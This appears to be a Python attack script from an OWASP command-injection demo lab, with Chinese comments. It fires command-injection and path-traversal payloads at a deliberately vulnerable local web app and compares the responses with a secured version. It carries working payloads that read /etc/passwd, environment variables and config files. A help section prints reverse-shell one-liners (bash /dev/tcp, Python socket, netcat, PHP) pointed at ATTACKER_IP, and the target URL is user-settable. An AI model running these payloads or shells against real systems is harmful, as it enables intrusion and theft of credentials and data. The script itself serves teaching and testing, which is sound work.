#!/usr/bin/env python3
"""
OWASP A03:2021 - OS Command Injection Attack Script
====================================================

作業系統命令注入攻擊展示：
1. Command Chaining (命令串接)
2. Command Substitution (命令替換)
3. Pipe Injection (管道注入)
4. File Read via Command Injection

CWE-78: Improper Neutralization of Special Elements used in an OS Command
https://cwe.mitre.org/data/definitions/78.html

Author: OWASP Demo
"""

import requests
import argparse
import json
import time

# ANSI Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'

VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"


def print_banner():
    print(f"""
{RED}╔═══════════════════════════════════════════════════════════════════════════╗
║   ██████╗ ███████╗     ██████╗ ███╗   ███╗██████╗      ██╗███╗   ██╗     ██║
║  ██╔═══██╗██╔════╝    ██╔════╝ ████╗ ████║██╔══██╗     ██║████╗  ██║     ██║
║  ██║   ██║███████╗    ██║      ██╔████╔██║██║  ██║     ██║██╔██╗ ██║     ██║
║  ██║   ██║╚════██║    ██║      ██║╚██╔╝██║██║  ██║██   ██║██║╚██╗██║     ██║
║  ╚██████╔╝███████║    ╚██████╗ ██║ ╚═╝ ██║██████╔╝╚█████╔╝██║ ╚████║██╗  ██║
║   ╚═════╝ ╚══════╝     ╚═════╝ ╚═╝     ╚═╝╚═════╝  ╚════╝ ╚═╝  ╚═══╝╚═╝  ╚║
║                                                                             ║
║  OWASP A03:2021 - OS Command Injection Attack Script                       ║
║  CWE-78: OS Command Injection                                               ║
╚═══════════════════════════════════════════════════════════════════════════╝{RESET}
""")


def ping_injection(base_url):
    """Ping 端點的命令注入"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[1] Ping Command Injection - Ping 端點命令注入{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"\n{YELLOW}目標端點: {base_url}/api/system/ping{RESET}")
    print(f"{YELLOW}攻擊原理: 在 host 參數中注入額外命令{RESET}")
    
    payloads = [
        ("127.0.0.1; id", "分號串接 - 執行 id 命令"),
        ("127.0.0.1 | id", "管道符 - 將輸出傳遞給 id"),
        ("127.0.0.1 && whoami", "AND 串接 - 執行 whoami"),
        ("$(whoami)", "命令替換 - 內嵌執行 whoami"),
        ("`id`", "反引號替換 - 內嵌執行 id"),
        ("127.0.0.1; cat /etc/passwd", "讀取 /etc/passwd"),
        ("127.0.0.1; ls -la /", "列出根目錄"),
    ]
    
    for payload, description in payloads:
        print(f"\n{BLUE}[*] {description}{RESET}")
        print(f"    Payload: {payload}")
        
        try:
            response = requests.get(
                f"{base_url}/api/system/ping",
                params={"host": payload},
                timeout=15
            )
            
            data = response.json()
            output = data.get("output", "")
            command = data.get("command", "")
            
            # 檢查是否成功執行了注入的命令
            success_indicators = ["uid=", "root:", "nobody:", "www-data", "total ", "drwx"]
            
            if any(indicator in output for indicator in success_indicators):
                print(f"{GREEN}    [SUCCESS] ✓ 命令注入成功！{RESET}")
                print(f"{GREEN}    執行的命令: {command}{RESET}")
                print(f"\n    {YELLOW}輸出 (前 500 字元):{RESET}")
                print(f"    {output[:500]}")
                if len(output) > 500:
                    print(f"    ... (還有 {len(output) - 500} 字元)")
            else:
                print(f"{YELLOW}    [?] 回應: {output[:100]}{RESET}")
                
        except Exception as e:
            print(f"{RED}    [ERROR] {str(e)}{RESET}")


def lookup_injection(base_url):
    """DNS Lookup 端點的命令注入"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[2] DNS Lookup Command Injection - DNS 查詢命令注入{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"\n{YELLOW}目標端點: {base_url}/api/system/lookup{RESET}")
    
    payloads = [
        ("google.com; id", "分號串接"),
        ("google.com | cat /etc/passwd", "管道符讀取密碼檔"),
        ("google.com && env", "顯示環境變數"),
    ]
    
    for payload, description in payloads:
        print(f"\n{BLUE}[*] {description}{RESET}")
        print(f"    Payload: {payload}")
        
        try:
            response = requests.get(
                f"{base_url}/api/system/lookup",
                params={"domain": payload},
                timeout=15
            )
            
            data = response.json()
            output = data.get("output", "")
            
            if "uid=" in output or "root:" in output or "PATH=" in output:
                print(f"{GREEN}    [SUCCESS] ✓ 命令注入成功！{RESET}")
                print(f"    {output[:300]}")
            else:
                print(f"{YELLOW}    [?] 回應: {output[:100]}{RESET}")
                
        except Exception as e:
            print(f"{RED}    [ERROR] {str(e)}{RESET}")


def system_info_injection(base_url):
    """System Info 端點的任意命令執行"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[3] System Info - 任意命令執行{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"\n{YELLOW}目標端點: {base_url}/api/system/info{RESET}")
    print(f"{YELLOW}攻擊原理: cmd 參數直接作為命令執行{RESET}")
    
    commands = [
        ("id", "顯示用戶身份"),
        ("whoami", "顯示當前用戶"),
        ("uname -a", "顯示系統資訊"),
        ("cat /etc/passwd", "讀取密碼檔"),
        ("env", "顯示環境變數"),
        ("ps aux | head -20", "顯示執行中的程序"),
        ("ls -la /app", "列出應用程式目錄"),
        ("cat /app/application.yml 2>/dev/null || cat /app/config/application.yml 2>/dev/null || echo 'Config not found'", "嘗試讀取設定檔"),
    ]
    
    for cmd, description in commands:
        print(f"\n{BLUE}[*] {description}{RESET}")
        print(f"    Command: {cmd}")
        
        try:
            response = requests.get(
                f"{base_url}/api/system/info",
                params={"cmd": cmd},
                timeout=15
            )
            
            if response.status_code == 200:
                data = response.json()
                output = data.get("output", "")
                
                print(f"{GREEN}    [SUCCESS] ✓ 命令執行成功！{RESET}")
                print(f"\n    {YELLOW}輸出:{RESET}")
                for line in output.split('\n')[:10]:
                    print(f"    {line}")
                if output.count('\n') > 10:
                    print(f"    ... (還有 {output.count(chr(10)) - 10} 行)")
            else:
                print(f"{RED}    [-] 失敗: {response.status_code}{RESET}")
                
        except Exception as e:
            print(f"{RED}    [ERROR] {str(e)}{RESET}")


def log_file_injection(base_url):
    """Log File 讀取 + 命令注入"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[4] Log File Path Traversal + Command Injection{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"\n{YELLOW}目標端點: {base_url}/api/system/read-log{RESET}")
    print(f"{YELLOW}攻擊原理: 路徑穿越 + 命令注入{RESET}")
    
    payloads = [
        ("../../../etc/passwd", "路徑穿越讀取 /etc/passwd"),
        ("../../etc/hosts", "讀取 /etc/hosts"),
        ("test; cat /etc/passwd", "分號注入"),
        ("test | id", "管道注入"),
    ]
    
    for payload, description in payloads:
        print(f"\n{BLUE}[*] {description}{RESET}")
        print(f"    Payload: {payload}")
        
        try:
            response = requests.get(
                f"{base_url}/api/system/read-log",
                params={"filename": payload},
                timeout=15
            )
            
            data = response.json()
            output = data.get("output", "")
            
            if "root:" in output or "localhost" in output or "uid=" in output:
                print(f"{GREEN}    [SUCCESS] ✓ 攻擊成功！{RESET}")
                print(f"    {output[:300]}")
            else:
                print(f"{YELLOW}    [?] 回應: {output[:100] if output else 'Empty'}{RESET}")
                
        except Exception as e:
            print(f"{RED}    [ERROR] {str(e)}{RESET}")


def diagnose_injection(base_url):
    """網路診斷端點的多參數注入"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[5] Network Diagnose - 多參數命令注入{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"\n{YELLOW}目標端點: {base_url}/api/system/diagnose{RESET}")
    print(f"{YELLOW}攻擊原理: target, ports, tool 參數都可注入{RESET}")
    
    test_cases = [
        {
            "target": "127.0.0.1; id",
            "ports": "80",
            "tool": "nc",
            "description": "target 參數注入"
        },
        {
            "target": "127.0.0.1",
            "ports": "80; cat /etc/passwd",
            "tool": "nc",
            "description": "ports 參數注入"
        },
        {
            "target": "127.0.0.1",
            "ports": "80",
            "tool": "curl",
            "description": "使用 curl 工具"
        },
    ]
    
    for test in test_cases:
        print(f"\n{BLUE}[*] {test['description']}{RESET}")
        print(f"    Parameters: target={test['target']}, ports={test['ports']}, tool={test['tool']}")
        
        try:
            response = requests.post(
                f"{base_url}/api/system/diagnose",
                json=test,
                headers={"Content-Type": "application/json"},
                timeout=15
            )
            
            data = response.json()
            output = data.get("output", "")
            command = data.get("command", "")
            
            print(f"    Executed: {command}")
            
            if "uid=" in output or "root:" in output:
                print(f"{GREEN}    [SUCCESS] ✓ 命令注入成功！{RESET}")
                print(f"    {output[:200]}")
            else:
                print(f"{YELLOW}    [?] 輸出: {output[:100]}{RESET}")
                
        except Exception as e:
            print(f"{RED}    [ERROR] {str(e)}{RESET}")


def reverse_shell_info():
    """顯示反向 Shell 資訊（僅說明）"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[INFO] Reverse Shell - 反向 Shell（僅說明）{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    print(f"""
{YELLOW}反向 Shell 原理：{RESET}
攻擊者在自己的機器上監聽一個端口，然後透過命令注入讓目標伺服器
主動連回攻擊者，建立一個交互式的 shell 連線。

{YELLOW}常見的 Reverse Shell Payload：{RESET}

1. Bash:
   {BLUE}bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1{RESET}

2. Python:
   {BLUE}python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'{RESET}

3. Netcat:
   {BLUE}nc -e /bin/sh ATTACKER_IP 4444{RESET}

4. PHP:
   {BLUE}php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'{RESET}

{YELLOW}攻擊步驟：{RESET}

1. 在攻擊機上監聽：
   {BLUE}nc -lvnp 4444{RESET}

2. 透過命令注入執行 reverse shell payload：
   {BLUE}curl "http://target/api/system/ping?host=127.0.0.1;bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261"{RESET}

{RED}⚠️ 警告：本腳本不會執行實際的反向 Shell 攻擊。
   這類攻擊僅應在授權的滲透測試環境中進行。{RESET}
""")


def compare_vulnerability():
    """比較漏洞版本與安全版本"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}比較漏洞版本 vs 安全版本{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    test_cases = [
        {
            "name": "Ping 命令注入",
            "endpoint": "/api/system/ping",
            "params": {"host": "127.0.0.1; id"},
        },
        {
            "name": "任意命令執行",
            "endpoint": "/api/system/info",
            "params": {"cmd": "cat /etc/passwd"},
        },
        {
            "name": "Log 檔案讀取",
            "endpoint": "/api/system/read-log",
            "params": {"filename": "../../../etc/passwd"},
        },
    ]
    
    for test in test_cases:
        print(f"\n{YELLOW}測試: {test['name']}{RESET}")
        print(f"端點: {test['endpoint']}")
        print(f"參數: {test['params']}")
        
        for name, url in [("漏洞版本", VULNERABLE_URL), ("安全版本", SECURE_URL)]:
            try:
                response = requests.get(
                    f"{url}{test['endpoint']}",
                    params=test['params'],
                    timeout=10
                )
                
                status = response.status_code
                data = response.json()
                output = data.get("output", "")
                
                # 檢查是否成功讀取到敏感資訊
                if "root:" in output or "uid=" in output:
                    print(f"  {RED}✗ {name}: {status} - 攻擊成功（洩露敏感資訊）{RESET}")
                elif status == 400 or status == 403:
                    print(f"  {GREEN}✓ {name}: {status} - 攻擊被阻擋{RESET}")
                else:
                    print(f"  {YELLOW}? {name}: {status} - {data.get('error', 'Unknown')}{RESET}")
                    
            except Exception as e:
                print(f"  {RED}✗ {name}: 錯誤 - {str(e)}{RESET}")


def main():
    parser = argparse.ArgumentParser(
        description="OS Command Injection Attack Script for OWASP A03 Demo",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 command_injection.py --ping          # Ping 端點注入
  python3 command_injection.py --lookup        # DNS Lookup 注入
  python3 command_injection.py --info          # System Info 任意命令
  python3 command_injection.py --log           # Log 檔案讀取
  python3 command_injection.py --diagnose      # 網路診斷多參數注入
  python3 command_injection.py --reverse-shell # 反向 Shell 說明
  python3 command_injection.py --compare       # 比較安全/漏洞版本
  python3 command_injection.py --all           # 執行所有攻擊
        """
    )
    
    parser.add_argument("--ping", action="store_true", help="Ping 端點命令注入")
    parser.add_argument("--lookup", action="store_true", help="DNS Lookup 命令注入")
    parser.add_argument("--info", action="store_true", help="System Info 任意命令執行")
    parser.add_argument("--log", action="store_true", help="Log 檔案讀取 + 路徑穿越")
    parser.add_argument("--diagnose", action="store_true", help="網路診斷多參數注入")
    parser.add_argument("--reverse-shell", action="store_true", help="顯示反向 Shell 說明")
    parser.add_argument("--compare", action="store_true", help="比較安全/漏洞版本")
    parser.add_argument("--all", action="store_true", help="執行所有攻擊")
    parser.add_argument("--url", default=VULNERABLE_URL, help="目標 URL")
    
    args = parser.parse_args()
    
    print_banner()
    
    if not any([args.ping, args.lookup, args.info, args.log, 
                args.diagnose, args.reverse_shell, args.compare, args.all]):
        parser.print_help()
        return
    
    url = args.url
    
    if args.all:
        ping_injection(url)
        lookup_injection(url)
        system_info_injection(url)
        log_file_injection(url)
        diagnose_injection(url)
        reverse_shell_info()
    else:
        if args.ping:
            ping_injection(url)
        if args.lookup:
            lookup_injection(url)
        if args.info:
            system_info_injection(url)
        if args.log:
            log_file_injection(url)
        if args.diagnose:
            diagnose_injection(url)
        if args.reverse_shell:
            reverse_shell_info()
    
    if args.compare:
        compare_vulnerability()
    
    print(f"\n{GREEN}[*] OS Command Injection 攻擊展示完成{RESET}")


if __name__ == "__main__":
    main()
